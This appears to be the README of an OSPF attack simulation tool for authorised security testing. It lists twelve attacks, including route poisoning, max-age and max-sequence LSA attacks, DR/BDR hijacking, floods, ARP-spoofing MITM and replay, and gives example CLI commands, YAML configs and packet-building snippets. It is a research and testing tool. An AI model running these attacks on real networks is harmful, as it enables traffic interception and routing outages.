# OSPF Protocol Attack Simulator

OSPF 协议攻击模拟与测试工具，Python 库 + GUI + CLI 三层架构，支持 Win7+ 零依赖部署。

> [!CAUTION]
> **免责声明：本项目仅限授权安全测试、CTF 竞赛、安全研究与防御评估用途。**
>
> 在未获得网络所有者明确书面授权的情况下，使用本工具对任何网络进行攻击或干扰属于违法行为。使用者须自行承担所有法律风险与责任。
>
> - 仅在你拥有管理权限的隔离实验环境（如 Docker 拓扑、虚拟化网络实验室）中运行
> - 不得在运营商网络、企业生产网络或他人基础设施上使用
> - 本工具不包含任何隐蔽通信、持久化后门或反取证功能——所有攻击均在 OSPF 协议层面可审计
> - 项目作者不对本工具的滥用行为承担任何责任

## 特性

- **12 种攻击类型** — 覆盖邻接关系、LSA、DoS、协议级操控 4 大类
- **OSPF 认证支持** — Type 0（无）/ Type 1（明文）/ Type 2（MD5），RFC 2328 兼容
- **GUI 操作面板** — Tkinter 可视化配置，实时报文预览，嗅探/导入 pcap 自动填充参数
- **主动模式引擎** — 嗅探合法参数 → 建立 OSPF 邻接 → 注入毒化 LSA
- **被动嗅探式攻击** — 实时捕获 Hello 报文提取拓扑参数，精确模仿合法路由器
- **双嗅探模式** — 集线器环境混杂嗅探 / 交换环境 ARP 欺骗
- **旁路攻击** — 所有攻击均支持不建立邻居关系的旁路注入
- **三层配置** — 默认值 → YAML 配置文件 → CLI 参数，后者覆盖前者
- **自包含部署** — PyInstaller 打包为单 exe，内嵌 Npcap 自动检测安装
- **集成测试** — Docker FRRouting 拓扑 + 50 协议状态验证测试（含认证 + 主动模式）

## 快速开始

```bash
pip install -e ".[dev]"
ospf-attack --help

# 启动 GUI 操作面板
python -m ospf_attack
```

### 基础用法

```bash
# GUI 操作面板 (可视化配置所有参数)
python -m ospf_attack

# 集线器模式 Hello 注入
ospf-attack hello-inject --iface eth0 --target 224.0.0.5 --router-id 9.9.9.9

# ARP 欺骗模式下 Max-Age 攻击
ospf-attack max-age --iface eth0 --target 224.0.0.5 \
    --sniff-mode arp_spoof --arp-target-a 10.0.0.1 --arp-target-b 10.0.0.2

# 加载 YAML 配置文件
ospf-attack mitm --config ./mitm_attack.yaml

# JSON 格式输出
ospf-attack flood --iface eth0 --target 224.0.0.5 --duration 30 --output json
```

## 攻击类型

### 邻接关系攻击

| 命令 | 描述 | 攻击手法 |
|------|------|---------|
| `hello-inject` | 恶意 Hello 注入 | 持续发送伪造 Hello 建立未授权邻接关系，支持高优先级抢占 |
| `adjacency-break` | 邻接关系破坏 | 注入畸形 Hello（错误 Area ID）破坏合法邻居关系 |
| `dr-bdr-hijack` | DR/BDR 选举操纵 | 发送 Priority=255 的 Hello 抢占指定路由器角色 |

### LSA 攻击

| 命令 | 描述 | 攻击手法 |
|------|------|---------|
| `route-inject` | 路由注入/毒化 | 构造毒化 LSA（Type-5 外部路由或 Type-3 区域间路由）注入 |
| `max-seq` | 最大序列号攻击 | 发送 Sequence=0x7FFFFFFF 的 LSU 覆盖合法 LSA |
| `max-age` | Max-Age 攻击 | 发送 Age=3600 的 LSU 迫使目标清除 LSA |
| `fight-back` | Fight-back 反击 | 持续注入递增序列号的对抗 LSA，阻止合法 LSA 传播 |

### 拒绝服务攻击

| 命令 | 描述 | 攻击手法 |
|------|------|---------|
| `flood` | Hello/LSA 泛洪 | 多线程高频发送 Hello 报文耗尽路由器 CPU |
| `spf-recalc` | SPF 重计算攻击 | 持续注入变化的 Router-LSA 迫使反复 SPF 计算 |
| `db-overflow` | 数据库溢出 | 注入大量 Type-5 外部 LSA 填满链路状态数据库 |

### 协议级操控攻击

| 命令 | 描述 | 攻击手法 |
|------|------|---------|
| `mitm` | 中间人攻击 | 拦截 OSPF 报文 → 篡改字段 → 转发，支持 drop/modify/forward/inject |
| `replay` | 重放攻击 | 从 pcap 文件读取报文重新发送，引发路由震荡 |

## OSPF 认证支持

所有攻击模块支持三种 OSPF 认证类型（RFC 2328 Appendix D）：

| auth_type | 类型 | 说明 |
|-----------|------|------|
| `none` | Type 0 (Null) | 无认证（默认） |
| `plain` | Type 1 (Plaintext) | 8 字节明文密码 |
| `md5` | Type 2 (MD5) | 加密序列号 + 128-bit HMAC-MD5 |

### YAML 配置认证

```yaml
# auth_attack.yaml
iface: eth0
target: 224.0.0.5
router_id: 9.9.9.9
auth_type: md5
auth_key: mypassword123
lsa_type: 5
metric: 100
```

```bash
ospf-attack route-inject --config auth_attack.yaml
```

### 代码中使用

```python
from ospf_attack.core.auth import AUTH_NONE, AUTH_PLAIN, AUTH_MD5, build_ospf_auth
from ospf_attack.core.packet import build_hello_packet, build_lsu_packet

# Hello 报文 — 明文认证
pkt = build_hello_packet(
    router_id="1.1.1.1", area_id="0.0.0.0",
    src_ip="10.0.0.1", dst_ip="224.0.0.5",
    auth_type=AUTH_PLAIN, auth_key=b"secret",
)

# LSU 报文 — MD5 认证
pkt = build_lsu_packet(
    router_id="1.1.1.1", area_id="0.0.0.0",
    src_ip="10.0.0.1", dst_ip="224.0.0.6",
    auth_type=AUTH_MD5, auth_key=b"mykey", crypto_seq=1,
)

# 主动模式引擎 + MD5
from ospf_attack.core.active_engine import ActiveOSPFEngine
engine = ActiveOSPFEngine(iface="eth0", spoofed_router_id="9.9.9.9",
                          auth_type=AUTH_MD5, auth_key=b"mykey")
```

## 配置

### CLI 参数

```
--iface           REQUIRED  网卡接口
--target          REQUIRED  目标 IP 或网段
--passive/--active          攻击模式（默认 passive）
--sniff-mode                嗅探模式: hub|arp_spoof（默认 hub）
--router-id                 伪装路由器 ID（默认 1.1.1.1）
--area-id                   OSPF 区域（默认 0.0.0.0）
--sniff-duration            嗅探持续时间（默认 30s）
--arp-target-a              ARP 欺骗目标 A
--arp-target-b              ARP 欺骗目标 B
--arp-interval              ARP 欺骗间隔（默认 2s）
--packet-rate               每秒发包数（默认 10）
--max-packets               最大发包数（默认 0=不限）
--config                    YAML 配置文件路径
--output                    输出格式: table|json（默认 table）
--verbose/-no-verbose       详细输出
--pcap-output               pcap 保存路径
```

### YAML 配置

```yaml
# mitm_attack.yaml
iface: eth1
target: 10.0.0.0/24
sniff_mode: arp_spoof
arp_target_a: 10.0.0.1
arp_target_b: 10.0.0.2
arp_interval: 2
mode: passive
sniff_duration: 60
action: modify
modify_rules:
  - field: lsa.age
    set: 3600
verbose: true
```

## 架构

```
ospf_attack/
├── core/           # 核心引擎
│   ├── auth.py         OSPF 认证模块 (Type 0/1/2, RFC 2328 D.3)
│   ├── packet.py       OSPF 报文构造/解析 (Scapy, LSA body 字节级构建)
│   ├── neighbor.py     邻居状态机 (NeighborState 枚举, RFC 2328)
│   ├── sniffer.py      被动嗅探引擎 (pcap-ct + Npcap)
│   ├── arp_spoof.py    ARP 欺骗引擎 (自动 MAC 学习 + 恢复)
│   └── active_engine.py ★ 主动模式引擎 (嗅探→邻接建立→LSA注入)
├── attacks/        # 攻击插件
│   ├── base.py         BaseAttack 抽象基类 (4 阶段生命周期)
│   ├── adjacency/      邻接关系攻击 (hello-inject, adjacency-break, dr-bdr-hijack)
│   ├── lsa/            LSA 攻击 (route-inject, max-seq, max-age, fight-back)
│   ├── dos/            拒绝服务 (flood, spf-recalc, db-overflow)
│   └── protocol/       协议级操控 (mitm, replay)
├── gui/            # Tkinter GUI 操作面板
│   ├── app.py          主窗口 (1100x720)
│   ├── attack_tree.py  攻击列表 (Treeview, 4 类 12 攻击)
│   ├── config_form.py  动态表单 (FIELD_META 42+ 字段, 报文预览)
│   ├── log_panel.py    日志面板 (Queue 线程安全, 彩色输出)
│   ├── pcap_tools.py   报文嗅探 / pcap 导入 / PacketBrowser
│   ├── runner.py       后台攻击线程
│   └── styles.py       颜色/字体/间距常量
├── network/        # 网络层
│   ├── adapter.py      网卡抽象 (MAC/IP 获取)
│   └── sender.py       发包器 (Scapy send/sendp, 速率限制)
├── config/         # 配置体系
│   ├── config.py       加载器 (YAML+CLI 三层优先级合并)
│   └── types.py        6 个 dataclass 配置类型
├── cli/            # Click CLI
│   ├── main.py         入口点
│   ├── commands.py     12 子命令注册
│   └── formatters.py   输出格式化 (table/json)
├── npcap/          # Npcap 依赖管理
└── utils/          # 工具函数
tests/
├── unit/           # 105 单元测试
└── integration/    # 50 集成测试 (Docker FRR, 含认证+主动模式)
```

## 构建 exe

```powershell
# 1. 下载 Npcap 安装程序放到 assets/
# 2. 运行构建
.\build.ps1
# 输出: dist/ospf-attack.exe (~45MB)
```

## 测试

```bash
# 单元测试 (105 tests)
pytest tests/unit/ -v

# 集成测试 — 需要 Docker Desktop + FRRouting
# 启动拓扑 → 运行测试
docker compose -f docker/topo1-single-area/docker-compose.yml up -d
pytest tests/integration/ -v    # 50 tests
docker compose -f docker/topo1-single-area/docker-compose.yml down -v

# 全部测试: 155 tests
```

## 技术栈

| 层 | 技术 |
|---|------|
| 语言 | Python 3.10+ |
| 协议引擎 | Scapy (`scapy.contrib.ospf`) + 手动字节级 LSA 构建 |
| 认证 | hashlib + hmac (纯标准库, Win7+ 兼容) |
| 报文捕获 | pcap-ct + Npcap (Windows) / AF_PACKET raw socket (Linux/Docker) |
| CLI | Click (12 子命令) |
| GUI | Tkinter + ttk (零额外依赖) |
| 打包 | PyInstaller `--onefile` |
| 测试 | pytest (155 tests: 105 unit + 50 integration) |
| 配置 | YAML (三层优先级: 默认→YAML文件→CLI参数) |
| 集成拓扑 | Docker + FRRouting (FRR) 容器 |

## 许可证

MIT
